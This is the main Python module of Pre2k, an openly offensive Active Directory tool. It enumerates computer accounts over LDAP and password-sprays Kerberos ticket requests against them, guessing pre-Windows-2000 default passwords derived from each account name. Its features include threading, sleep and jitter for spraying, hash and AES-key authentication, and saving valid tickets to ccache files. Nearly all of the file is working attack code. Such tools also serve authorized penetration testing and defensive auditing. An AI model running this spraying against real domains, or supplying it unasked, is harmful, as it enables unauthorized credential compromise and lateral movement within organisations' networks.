#####
# Main Pre2k logic
from impacket.krb5.kerberosv5 import KerberosError
from concurrent.futures import ThreadPoolExecutor, as_completed
from pre2k import __version__
from pre2k.logger import console, logger, init_logger, OBJ_EXTRA_FMT
from pre2k.lib.gettgt import GETTGT
from pre2k.lib.ldap import init_ldap_session
from pre2k.lib.machine_hunter import MachineHunter
from random import randint
from getpass import getpass
import time
from datetime import datetime
import sys
import ldap3


class Pre2k:
    def __init__(self, username=None, password=None, domain=None, dc_ip=None, ldaps=False, kerberos=False, no_pass=False, 
                    hashes=None, aes=None, targeted=False, verbose=False, outputfile=None, inputfile=None,
                    stop_on_success=False, save=False, empty_pass=False, sleep=None, jitter=None, threads=None, authenticated=True):
        self.username = username
        self.password = password
        self.domain = domain
        self.ldaps = ldaps
        self.kerberos = kerberos
        self.no_pass = no_pass
        self.hashes = hashes
        self.aes = aes
        self.targeted = targeted
        self.verbose = verbose
        self.outputfile = outputfile
        self.inputfile = inputfile
        self.stop_on_success = stop_on_success
        self.save = save
        self.empty_pass = empty_pass
        self.sleep = sleep
        self.jitter = jitter
        self.threads = threads
        self.authenticated = authenticated

        if dc_ip == None:
            self.dc_ip = self.domain
        else:
            self.dc_ip = dc_ip
        
        self.creds = []
        self.tried = 0
        self.valid = 0


    def run(self):
        Pre2k.show_banner()
        init_logger(self.verbose)
        if not self.authenticated:
            self.parse_input()
            self.pw_spray()
        else:
            lmhash = ""
            nthash = ""
            if self.hashes:
                lmhash, nthash = self.hashes.split(':')
            if not (self.password or self.hashes or self.aes or self.no_pass):
                    self.password = getpass("Password:")

            try:
                ldap_server, ldap_session = init_ldap_session(domain=self.domain, username=self.username, password=self.password, lmhash=lmhash, nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip, aesKey=self.aes, hashes=self.hashes, ldaps=self.ldaps)
            except ldap3.core.exceptions.LDAPSocketOpenError as e: 
                if 'invalid server address' in str(e):
                    logger.error (f'Invalid server address - {self.domain}')
                else:
                    logger.error ('Error connecting to LDAP server')
                    print()
                    logger.error(e)
                exit()
            except ldap3.core.exceptions.LDAPBindError as e:
                logger.error(f'Error: {str(e)}')
                exit()
            finder=MachineHunter(ldap_server, ldap_session, domain=self.domain, targeted=self.targeted)
            self. creds = finder.fetch_computers(ldap_session)
            self.pw_spray()


    def pw_spray(self):
        dt = datetime.now()
        logger.info(f"Testing started at {dt.strftime('%Y-%m-%d %H:%M:%S')}")
        if self.empty_pass: 
            logger.info("Testing with empty password.")
        with console.status(f"", spinner="dots") as status:
            if self.sleep:
                self.threads = 1 # no point in threading if we're sleeping b/w attempts
            logger.info(f'Using {self.threads} threads')
            with ThreadPoolExecutor(max_workers=self.threads) as pool:
                try:
                    # queue the jobs
                    future_validate = {pool.submit(self.spray, cred, status): cred for cred in self.creds}
                    
                    # as threads complete, check if we should be stopping
                    for validate in as_completed(future_validate):
                        if validate._result and self.stop_on_success:
                            logger.info("Valid credential found! Stopping session...")
                            pool.shutdown(wait=False, cancel_futures=True)
                            sys.exit()
                            
                except KeyboardInterrupt:
                    logger.info("Stopping session...")
                    sys.exit()


    def spray(self, cred, status):
        status.update(f"Tried {self.tried}/{len(self.creds)}. {self.valid} valid.")
        self.tried += 1
        username, password = cred.split(":")
        if self.empty_pass:
            password = ''
        try:
            executer = GETTGT(username, password, self.domain, self.dc_ip)
            validate = executer.run(self.save)
        except KerberosError:
            if self.empty_pass:
                line = (f'Invalid credentials: {self.domain}\\{username}:nopass')
            else:
                line = (f'Invalid credentials: {self.domain}\\{cred}')
            logger.debug (line)
            if self.outputfile:
                    self.printlog(line)
            self.delay()
            return False
        if validate:
            self.valid += 1
            if self.empty_pass:
                line = (f'[green bold]VALID CREDENTIALS[/]: {self.domain}\\{username}:nopass')

            else:   
                line = (f'[green bold]VALID CREDENTIALS[/]: {self.domain}\\{cred}')
            logger.info (line, extra=OBJ_EXTRA_FMT)
            if self.outputfile:
                self.printlog(line.split(":"))
            if self.save:
                logger.info(f'Saving ticket in {username}.ccache')
            
            self.delay()
            return True


    def delay(self):
        if self.sleep and self.jitter:
            delay = self.sleep + (self.sleep * (randint(1, self.jitter) / 100))
            logger.debug (f'Sleeping {delay} seconds until next attempt.')
            time.sleep(delay)
        elif self.sleep and not self.jitter:
            logger.debug(f'Sleeping {self.sleep} seconds until next attempt.')
            time.sleep(self.sleep)

    
    def parse_input(self):
        y = self.inputfile.read().split("\n")
        for i in y:
            if len(i) >= 15:
                # if accountname is 15 chars or more pw is first 14
                credentials = i[:15] + ":" + i.lower()[:14]
            else:
                credentials = i + ":" + i.lower()[:-1]
            self.creds.append(credentials)


    def printlog(self, line):
        with open(self.outputfile, 'a') as f:
            f.write("{}\n".format(line))
            f.close


    @staticmethod
    def show_banner():
        banner = f'''
                                ___    __         
                              /'___`\ /\ \        
 _____   _ __    __          /\_\ /\ \\\\ \ \/'\    
/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <    
\ \ \L\ \ \ \//\  __//\______\  // /_\ \\\\ \ \\\\`\  
 \ \ ,__/\ \_\\\\ \____\/______/ /\______/ \ \_\ \_\\
  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/
   \ \_\                                      v{__version__}    
    \/_/                                          
                                            @garrfoster
                                            @Tw1sm          
'''
        print(banner)